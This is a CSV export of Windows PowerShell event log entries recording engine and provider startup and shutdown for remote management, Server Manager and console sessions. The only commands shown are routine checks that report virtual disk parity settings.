Level,Date and Time,Source,Event ID,Task Category
Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=21

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=19

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:10 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=17

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.17763.2931
	RunspaceId=cdf14365-a2b6-4d88-ad29-f331b69c6e34
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:10 PM,PowerShell,600,Provider Lifecycle,"Provider ""WSMan"" is Started. 

Details: 
	ProviderName=WSMan
	NewProviderState=Started

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:10 PM,PowerShell,600,Provider Lifecycle,"Provider ""Certificate"" is Started. 

Details: 
	ProviderName=Certificate
	NewProviderState=Started

	SequenceNumber=13

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:10 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:10 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:10 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:10 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:10 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:10 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:07 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=17

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
	HostApplication=C:\Windows\system32\ServerManager.exe
	EngineVersion=5.1.17763.2931
	RunspaceId=d42fe92b-e091-4498-8815-fb9f134b316a
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:07 PM,PowerShell,600,Provider Lifecycle,"Provider ""WSMan"" is Started. 

Details: 
	ProviderName=WSMan
	NewProviderState=Started

	SequenceNumber=15

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
	HostApplication=C:\Windows\system32\ServerManager.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:07 PM,PowerShell,600,Provider Lifecycle,"Provider ""Certificate"" is Started. 

Details: 
	ProviderName=Certificate
	NewProviderState=Started

	SequenceNumber=13

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
	HostApplication=C:\Windows\system32\ServerManager.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:06 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
	HostApplication=C:\Windows\system32\ServerManager.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:06 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
	HostApplication=C:\Windows\system32\ServerManager.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:06 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
	HostApplication=C:\Windows\system32\ServerManager.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:06 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
	HostApplication=C:\Windows\system32\ServerManager.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:06 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
	HostApplication=C:\Windows\system32\ServerManager.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:06 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
	HostApplication=C:\Windows\system32\ServerManager.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:10:50 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=f006ae17-644b-4fb7-8aae-2b7a6a8d64e8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.17763.2931
	RunspaceId=2ecaf26d-b47c-488d-b622-beedb1019255
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:10:50 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=f006ae17-644b-4fb7-8aae-2b7a6a8d64e8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:10:50 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=f006ae17-644b-4fb7-8aae-2b7a6a8d64e8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:10:50 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=f006ae17-644b-4fb7-8aae-2b7a6a8d64e8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:10:50 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=f006ae17-644b-4fb7-8aae-2b7a6a8d64e8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:10:50 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=f006ae17-644b-4fb7-8aae-2b7a6a8d64e8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:10:50 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=f006ae17-644b-4fb7-8aae-2b7a6a8d64e8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/29/2025 8:55:04 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=cfd7bd11-07fd-4938-a22d-9ece95b49209
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=5.1.17763.2931
	RunspaceId=606599c1-d44a-4c21-b415-a574dd1f8e79
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/29/2025 8:55:00 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=cfd7bd11-07fd-4938-a22d-9ece95b49209
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=5.1.17763.2931
	RunspaceId=606599c1-d44a-4c21-b415-a574dd1f8e79
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/29/2025 8:55:00 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=cfd7bd11-07fd-4938-a22d-9ece95b49209
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/29/2025 8:55:00 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=cfd7bd11-07fd-4938-a22d-9ece95b49209
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/29/2025 8:55:00 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=cfd7bd11-07fd-4938-a22d-9ece95b49209
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/29/2025 8:55:00 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=cfd7bd11-07fd-4938-a22d-9ece95b49209
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/29/2025 8:55:00 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=cfd7bd11-07fd-4938-a22d-9ece95b49209
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/29/2025 8:55:00 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=cfd7bd11-07fd-4938-a22d-9ece95b49209
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/29/2025 8:55:00 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=e4b5d6a3-8292-4b2e-811c-775112c2ff9d
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
	EngineVersion=5.1.17763.2931
	RunspaceId=d0397fdb-057d-40a9-916a-8003d1e57fd4
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/29/2025 8:54:59 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=e4b5d6a3-8292-4b2e-811c-775112c2ff9d
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
	EngineVersion=5.1.17763.2931
	RunspaceId=d0397fdb-057d-40a9-916a-8003d1e57fd4
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/29/2025 8:54:59 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=e4b5d6a3-8292-4b2e-811c-775112c2ff9d
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/29/2025 8:54:59 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=e4b5d6a3-8292-4b2e-811c-775112c2ff9d
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/29/2025 8:54:59 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=e4b5d6a3-8292-4b2e-811c-775112c2ff9d
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/29/2025 8:54:59 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=e4b5d6a3-8292-4b2e-811c-775112c2ff9d
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/29/2025 8:54:59 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=e4b5d6a3-8292-4b2e-811c-775112c2ff9d
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/29/2025 8:54:59 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=e4b5d6a3-8292-4b2e-811c-775112c2ff9d
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/28/2025 8:54:22 AM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=83098ff6-0b0c-4afc-b51c-9805a4e1b9f0
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=5.1.17763.2931
	RunspaceId=ffc11ae8-252a-4b1a-ab52-9159c75794f0
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/28/2025 8:54:11 AM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=83098ff6-0b0c-4afc-b51c-9805a4e1b9f0
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=5.1.17763.2931
	RunspaceId=ffc11ae8-252a-4b1a-ab52-9159c75794f0
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/28/2025 8:54:11 AM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=83098ff6-0b0c-4afc-b51c-9805a4e1b9f0
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/28/2025 8:54:11 AM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=83098ff6-0b0c-4afc-b51c-9805a4e1b9f0
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/28/2025 8:54:11 AM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=83098ff6-0b0c-4afc-b51c-9805a4e1b9f0
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,9/28/2025 8:54:11 AM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=83098ff6-0b0c-4afc-b51c-9805a4e1b9f0
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
